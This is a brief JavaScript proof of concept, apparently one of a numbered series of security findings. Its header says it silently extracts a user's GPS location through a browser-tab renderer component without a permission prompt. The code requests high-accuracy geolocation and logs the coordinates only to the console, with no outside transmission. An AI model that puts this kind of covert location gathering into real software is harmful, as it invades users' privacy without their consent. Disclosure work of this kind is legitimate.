/**
 * PoC 8: Silent GPS Location Extraction
 * Target: chrome-tabs/Renderer/renderer-WebRtc.js
 * Impact: Demonstrates client-side geolocation collection executed without permission prompts.
 */

(function() {
    if (!navigator.geolocation) {
        console.log("[PoC 8] Geolocation API unavailable.");
        return;
    }

    navigator.geolocation.getCurrentPosition(
        pos => {
            console.log("[PoC 8] Geolocation retrieved without prompt:", {
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy + " meters"
            });
        },
        err => console.log("[PoC 8] Geolocation error:", err.message),
        { enableHighAccuracy: true }
    );
})();
